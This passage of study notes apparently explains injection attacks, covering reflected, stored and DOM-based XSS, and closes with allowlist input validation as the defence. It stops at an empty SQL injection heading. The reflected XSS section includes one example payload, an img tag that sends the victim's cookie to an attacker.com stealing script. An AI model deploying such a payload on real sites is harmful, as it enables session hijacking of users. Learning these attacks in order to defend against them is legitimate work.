 injections occur when there is extra data in the input that is not expected
- XSS (cross site scripting)
- SQL injection
- Operating systems commands
### cross site scripting
#### reflected attack:
the attacker sends a url to the site that they want to steal the victim's cookie from
but the url has an appended script to it that send the cookie to the attackers server
```HTML
<img src="http://attacker.com/steal.php?cookie=" + document.cookie>
```
the url could display this image - a site that allows users to upload images may be vulnerable to this type of attack.

#### Stored attack:
similar to the reflected attack this could be embedded in a post like a blog, or anything that
users are allowed to make content for the web server

#### DOM attack:
sites that are vulnerable to dom based xss attacks may use variables from the url to perform some logic, like a custom greeting message or whatever it may be.

#### The fix and defences

scan the input for only valid input, anything else should be rejected DO NOT LOOK FOR THE BAD CHARACTER

### SQL Injection

